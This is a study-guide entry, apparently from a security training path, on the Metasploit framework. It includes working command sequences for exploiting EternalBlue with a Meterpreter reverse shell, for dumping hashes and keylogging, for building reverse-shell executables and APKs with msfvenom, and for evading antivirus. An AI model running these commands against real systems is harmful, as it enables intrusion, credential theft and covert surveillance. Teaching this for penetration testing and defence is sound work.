# Metasploit

## Definition
Metasploit is a penetration testing framework that provides a comprehensive platform for developing, testing, and executing exploit code against target systems. Developed by Rapid7, it includes a vast database of exploits, payloads, encoders, and auxiliary modules for reconnaissance, exploitation, post-exploitation, and pivoting. The most popular version is Metasploit Framework (MSF), an open-source Ruby-based tool.

## Why It Matters
Metasploit is the de facto standard tool for penetration testing and exploitation. It automates the process of exploiting known vulnerabilities, allowing security professionals to quickly test system defenses, demonstrate impact to stakeholders, and validate security controls. Understanding Metasploit is essential for red teamers, penetration testers, and blue teamers who need to understand attacker tools to defend against them.

## Where It Appears in the Path
Metasploit is introduced in the penetration testing module. It requires foundational knowledge of vulnerabilities (buffer overflows, web vulnerabilities), networking (ports, protocols), payloads (reverse shells, bind shells), and basic command-line usage. Metasploit is used throughout later topics on Windows exploitation, web exploitation, and post-exploitation.

## Prerequisites
- Understanding of vulnerabilities and exploits
- Networking fundamentals (ports, listeners)
- Basic Linux command line
- Knowledge of shell types (bind, reverse)

## Architecture

### Core Components

**msfconsole**: The primary command-line interface. Interactive environment for running exploits, configuring payloads, and managing sessions.

**Modules**: Discrete components performing specific functions:
- **Exploit**: Code that takes advantage of a vulnerability to deliver a payload. Example: `exploit/windows/smb/ms17_010_eternalblue`
- **Payload**: Code that runs after a successful exploit. Examples: `windows/meterpreter/reverse_tcp`, `linux/x64/shell_reverse_tcp`
- **Auxiliary**: Scanning, enumeration, fuzzing, and other non-exploit actions. Example: `auxiliary/scanner/portscan/tcp`
- **Post**: Post-exploitation modules for privilege escalation, credential dumping, persistence. Example: `post/windows/gather/hashdump`
- **Encoder**: Obfuscates payloads to evade signature-based detection. Example: `x86/shikata_ga_nai`
- **NOP**: No-operation sleds used in buffer overflow exploitation. Example: `x86/opty2`

**Database**: PostgreSQL backend for tracking hosts, services, vulnerabilities, loot, and credentials. Run `msfdb init` to set up.

**Meterpreter**: An advanced multi-function payload that provides dynamically extensible post-exploitation capabilities. Runs in memory (no disk writes), supports in-memory DLL injection, has built-in commands for file system, network, screenshots, keylogging, and more.

## Basic Workflow

### 1. Reconnaissance
```msf
search type:auxiliary name:portscan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.100
run
```

### 2. Search for Exploit
```msf
search ms17-010
search type:exploit platform:windows webapp
```

### 3. Configure Exploit
```msf
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
check        # Verify the target is vulnerable
```

### 4. Execute
```msf
exploit      # or 'run'
```

### 5. Post-Exploitation
```msf
getsystem    # Attempt privilege escalation
hashdump     # Dump password hashes
screenshot   # Capture screen
keyscan_start # Start keylogger
background   # Send session to background
sessions -i 1 # Resume session 1
```

## Key Features

### Payload Types
- **Staged**: Small initial stager downloads the full payload. `windows/meterpreter/reverse_tcp` — stager connects back, downloads stage.
- **Non-Staged**: Complete payload is sent in one shot. `windows/meterpreter_reverse_tcp` — single stage (larger, but no network trip for stage 2).
- **Bind Shell**: Opens a port on the target and waits for the attacker to connect (blocked by inbound firewalls).
- **Reverse Shell**: Target connects back to the attacker (more reliable — outbound connections often allowed).

### MSFVenom
Standalone payload generator outside msfconsole. Used to create custom payloads for various platforms.
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o payload.apk
```

### Resource Scripts
Automate Metasploit tasks using .rc resource scripts. Useful for reproducible testing.
```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
```

## Common Interview Questions
1. **What is Metasploit?** A penetration testing framework by Rapid7 that provides exploits, payloads, encoders, and post-exploitation modules for security testing.
2. **What is the difference between Meterpreter and a standard shell payload?** Meterpreter is an advanced payload running entirely in memory with extensive built-in commands, extensibility via DLL injection, and encrypted communication. Standard shell provides a basic OS command shell.
3. **What is the difference between staged and non-staged payloads?** Staged: small stager + separate stage download (stealthier, smaller initial size). Non-staged: single complete payload (larger, no additional network requests).
4. **What is MSFVenom used for?** Standalone payload generator for creating custom payloads (EXE, ELF, APK, PS1 scripts) for various platforms with options for encoding and evasion.
5. **How do you evade antivirus with Metasploit payloads?** (1) Use encoders (shikata_ga_nai). (2) Custom templates (microsoft office macros). (3) Use different output formats. (4) Manually modify/obfuscate payloads. (5) Use custom packers/protectors. Detection is an arms race — custom/private payloads work best.
6. **What post-exploitation modules are most useful?** hashdump (credential theft), getsystem (UAC bypass, privilege escalation), mimikatz (Kerberos/credential harvesting), screenshare/screenshot, keylog, persistence modules.

## Further Reading
- [Metasploit Documentation](https://docs.rapid7.com/metasploit/)
- [Metasploit Unleashed (Offensive Security)](https://www.offsec.com/metasploit-unleashed/) (free course)
- [Rapid7 Metasploit Blog](https://www.rapid7.com/blog/category/metasploit/)
- TryHackMe: Metasploit rooms (Introduction, Exploitation, Meterpreter)
- Hack The Box: Starting Point machines
